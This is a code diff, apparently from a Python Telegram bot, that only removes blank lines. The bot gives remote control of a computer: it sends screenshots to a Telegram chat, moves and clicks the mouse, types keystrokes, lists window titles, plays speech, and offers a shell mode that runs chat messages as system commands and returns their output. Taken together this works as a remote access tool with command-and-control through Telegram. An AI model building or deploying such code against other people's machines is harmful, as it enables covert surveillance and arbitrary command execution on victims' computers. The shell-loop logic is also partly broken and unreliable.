@@ -13,7 +13,6 @@ osmode = False
 def test(message):
     pyautogui.screenshot('ss.png')
     bot.send_photo(message.chat.id, open('ss.png', 'rb'))
-
 @bot.message_handler(commands=['mp','mouseposition'])
 def mp(message):
     pyautogui.screenshot('ss.png')
@@ -25,11 +24,9 @@ def mp(message):
     ssimage.save('ssout.png')
     bot.send_message(text=str(pyautogui.position()),chat_id=message.chat.id)
     bot.send_photo(message.chat.id, open('ssout.png','rb'))
-
 @bot.message_handler(commands=['test','t'])
 def test(message):
     bot.send_message(chat_id=message.chat.id,text=message)
-
 @bot.message_handler(commands=['moveTo','moveto'])
 def ptmove(message):
     print(message.text)
@@ -52,23 +49,17 @@ def ptmove(message):
         pyautogui.move(x,y)
     except:
         bot.send_message(text="usage: /move x y")
-
-
 @bot.message_handler(commands=['type'])
 def ptwrite(message):
     inpt = str(message.text).split('/type ')[1]
     pyautogui.typewrite(inpt)
-
 @bot.message_handler(commands=['press'])
 def ptpress(message):
     inpt = str(message.text).split('/press ')[1]
     pyautogui.press(inpt)
-
 @bot.message_handler(commands=['titles'])
 def getttl(message):
     bot.send_message(text=str(pyautogui.getAllTitles()),chat_id=message.chat.id)
-
-
 @bot.message_handler(commands=['click','c'])
 def ptclick(message):
     if message.text == "/click":
@@ -78,7 +69,6 @@ def ptclick(message):
         x = tinp[1]
         y = tinp[2]
         pyautogui.click(x,y)
-
 @bot.message_handler(commands=['rclick','rc'])
 def ptclick(message):
     if message.text == "/rclick":
@@ -88,8 +78,6 @@ def ptclick(message):
         x = tinp[1]
         y = tinp[2]
         pyautogui.leftClick(x,y)
-
- 
 @bot.message_handler(commands=['talk','tts'])
 def recaud(message):
     mytext = str(message.text).split(f"{message.text.split(' ')[0]}")[1]
@@ -101,7 +89,6 @@ def recaud(message):
     playsound(filename)
     #os.system(f'start {filename}')
     bot.send_audio(chat_id=message.chat.id, audio=open(filename, 'rb'))
- 
 @bot.message_handler(commands=['doubleclick','dc'])
 def ptdclick(message):
     if message.text == "/doubleclick":
@@ -115,18 +102,15 @@ def ptdclick(message):
 def oscmd(message):
     bot.send_message(text="Shell:",chat_id=message.chat.id)
     osmode = True
-
     while osmode:
         @bot.message_handler()
         def oscmdmode(message):
-
             msg = str(message.text)
             osmode = True
             print(msg)
             if msg == "exit":
                     osmode = False
                     bot.send_message(chat_id=message.chat.id, text="Exiting Shell")
-                    
                     exit
             if osmode:
                 if not msg.startswith('/'):
@@ -141,7 +125,6 @@ def oscmd(message):
                         bot.reply_to(message=message, text=outpt)
                         print(outpt)
                 else:
-                    pass
-                
+                    pass    
 print('Bot Started')
 bot.polling(non_stop=True)
